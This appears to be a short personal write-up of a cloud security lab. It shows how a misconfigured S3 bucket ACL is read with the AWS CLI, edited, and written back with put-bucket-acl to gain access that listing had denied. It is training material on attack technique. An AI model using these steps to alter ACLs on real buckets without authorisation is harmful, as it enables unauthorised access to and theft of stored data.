Similar to bucket policies, ACLs can be used to restrict/allow access to buckets and objects. A misconfigured bucket/object ACL can allow attackers to steal sensitive data and use the S3 bucket in other attacks.

In this lab, the ACLs allow reading the object but do not allow listing objects. There exists a misconfiguration in bucket ACL which can be leveraged to modify the ACL and identify the object.

==================================================================

List s3 buckets --> `aws s3api list-buckets`
List bucket objects --> `aws s3api list-objects --bucket s3-secret-400621074996`
Access denied due to insufficient permissions

Check bucket acl --> `aws s3api get-bucket-acl --bucket s3-secret-400621074996 > acl.json`

Modify acl.json 
1.- ![[Pasted image 20210826193407.png]]
2.- ![[Pasted image 20210826193512.png]]

Update ACL -->  `aws s3api put-bucket-acl --bucket s3-secret-400621074996 --access-control-policy file://acl.json`
ACL updated